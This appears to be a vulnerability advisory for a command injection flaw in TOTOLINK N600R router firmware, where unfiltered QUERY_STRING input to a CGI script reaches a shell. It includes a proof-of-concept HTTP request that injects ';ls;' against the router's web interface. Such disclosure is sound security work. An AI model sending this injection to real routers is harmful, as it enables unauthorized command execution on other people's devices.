# TOTOLINK N600R V5.3c.7159_B20190425 Has an command injection vulnerability

## Overview

- **Type**: command injection vulnerability
- **Vendor**: TOTOLINK (https://www.totolink.net/)
- **Products**: WiFi Router, such as N600R V5.3c.7159_B20190425
- **Firmware download address:**http://www.totolink.cn/data/upload/20210717/bc2b1d2206c4a7b1753c3d870cb15bff.zip



## Description

### 1.Product Information:

TOTOLINK N600R V5.3c.7159_B20190425 router, the latest version of simulation overview：

![Figure 1 Update date of the latest version of the firmware](image/1.png)



### 2. Vulnerability details

TOTOLINK N600R V5.3c.7159_B20190425 was discovered to contain a command injection vulnerability in the "Main" function. This vulnerability allows attackers to execute arbitrary commands via the QUERY_STRING parameter.

![Figure 2 Local of the vulnerability](image/2.png)

We can see that the os will get ` QUERY_STRING`  without filter splice to the string `;ps;` and execute it. So, If  we can control the `QUERY_STRING`, it can be command injection.

## 3. Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
GET /cgi-bin/downloadFlile.cgi?;ls; HTTP/1.1 
Host: 192.168.0.1 
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate 
Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
Cache-Control: max-age=0
```

![Figure 3 POC attack effect](image/3.png)
